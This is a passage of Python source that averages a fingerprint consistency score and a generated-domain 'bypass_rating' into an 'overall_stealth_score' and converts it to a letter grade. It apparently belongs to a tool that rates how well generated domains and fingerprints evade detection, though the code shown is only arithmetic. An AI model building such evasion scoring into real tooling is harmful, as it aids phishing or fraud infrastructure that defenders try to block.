        scores.append(config['fingerprint']['consistency_score'])
    if 'domains' in config and config['domains'].get('generated_domains'):
        scores.append(config['domains']['generated_domains'][0].get('bypass_rating', 70))

    config['overall_stealth_score'] = round(sum(scores) / len(scores)) if scores else 0
    config['stealth_grade'] = _score_to_grade(config['overall_stealth_score'])

    return config


def _score_to_grade(score):
    """Convert numeric score to letter grade."""
    if score >= 95:
        return 'A+'
    elif score >= 90:
        return 'A'
    elif score >= 85:
        return 'B+'
    elif score >= 80:
        return 'B'
    elif score >= 70:
        return 'C'
    elif score >= 60:
        return 'D'
    return 'F'
